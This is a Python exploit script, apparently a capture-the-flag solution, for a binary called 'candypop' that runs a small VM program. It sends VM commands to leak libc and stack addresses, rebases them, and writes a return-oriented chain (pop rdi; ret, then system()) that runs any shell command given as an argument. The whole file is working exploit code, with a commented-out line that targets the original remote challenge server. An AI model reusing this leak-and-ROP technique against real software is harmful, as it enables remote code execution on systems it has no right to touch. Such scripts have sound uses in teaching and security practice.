#! /usr/bin/env python

from __future__ import print_function
import sys
import os
from pwny import *


if len(sys.argv) < 2:
    print('usage: %s <command> [arg...]' % sys.argv[0], file=sys.stderr)
    sys.exit(1)


def connection_factory():
    # Connect to the candy machine (no longer available)
    # return Flow.connect_tcp('52.16.33.218', 22226)

    # If you want to use the local executable, use:
    return Flow.execute('./candypop')

    # Or, via ssh (I've got a virtual machine set up for this):
    # return Flow.execute_ssh('./candypop', '127.0.0.1', 2224)


# Assume the target of the candypop binary.
target.assume(ELF('candypop'))

# Load libc.so from ubuntu trusty tahr. Note: the libc.so version was deduced
# from the gcc signature in the candypop binary.
libc = ELF('candypop-libc.so')

# Get the offset of the system call within libc.
SYSTEM_ADDR = libc.get_symbol('system').value

# Find the offset of a suitable gadget.
GADGET_ADDR = find_gadget(libc, asm('pop rdi\nret'))[0]['addr']


# Function to pack a series of candypop VM commands
def build(c):
    return pack('>' + 'BBH' * (len(c) // 3), *c)


# Stage 1: leak addresses, initiate read.
def build_stage1():
    return build([
        # Write something to get required addresses on stack.
        0xa5, 0, 0,

        # Leak address inside libc.
        0xa5, 15, 0,
        0xa5, 14, 0,
        0xa5, 13, 0,
        0xa5, 12, 0,

        # Leak stack address.
        0xa5, 19, 0,
        0xa5, 18, 0,
        0xa5, 17, 0,
        0xa5, 16, 0,

        # Tell candy machine to read more data.
        0xfe, 0,  0,
    ])


# Parse a sequence of address parts to an address.
def parse_addr(c):
    return int(b''.join(c), 16)


# Parse leaked addresses, rebase to libc base and read buffer addresses.
def parse_addrs(data):
    libc_base = parse_addr(data[0:4]) - 0x6df52
    read_buffer = parse_addr(data[4:9]) - 0x4160
    return libc_base, read_buffer


def build_stage2(libc_base, read_buffer):
    gadget_addr = libc_base + GADGET_ADDR
    system_addr = libc_base + SYSTEM_ADDR
    system_arg = read_buffer + 52  # 52 = length of secondary program: 13 ops * 4 bytes.
    return build([
        # Write address of gadget (pop rdi; ret) to RP.
        0x10, 23, (gadget_addr >> 48) & 0xffff,
        0x10, 22, (gadget_addr >> 32) & 0xffff,
        0x10, 21, (gadget_addr >> 16) & 0xffff,
        0x10, 20, (gadget_addr >>  0) & 0xffff,

        # Write address of argument to system to RP+8.
        0x10, 27, (system_arg >> 48) & 0xffff,
        0x10, 26, (system_arg >> 32) & 0xffff,
        0x10, 25, (system_arg >> 16) & 0xffff,
        0x10, 24, (system_arg >>  0) & 0xffff,

        # Write address of system() to RP+16.
        0x10, 31, (system_addr >> 48) & 0xffff,
        0x10, 30, (system_addr >> 32) & 0xffff,
        0x10, 29, (system_addr >> 16) & 0xffff,
        0x10, 28, (system_addr >>  0) & 0xffff,

        # Return.
        0xde, 0, 0,
    ])


def candypop(system_cmd):
    # Connect to the candy machine.
    f = connection_factory()

    # Consume initial output.
    f.until(b'INPUT PROGRAM:\n')

    # Phase 1, leak addresses, initiate read.
    f.write(build_stage1(), echo=False)
    # Consume uninteresting output.
    f.until(b'0000\n')
    
    # Get the interesting bits.
    data = [l.strip() for l in f.readlines(8)]

    # Parse output and calculate relevant base addresses.
    libc_base, read_buffer = parse_addrs(data)

    # Send the secondary program.
    f.write(build_stage2(libc_base, read_buffer) + system_cmd, echo=False)

    f.read_eof(echo=True)


candypop(' '.join(sys.argv[1:]))
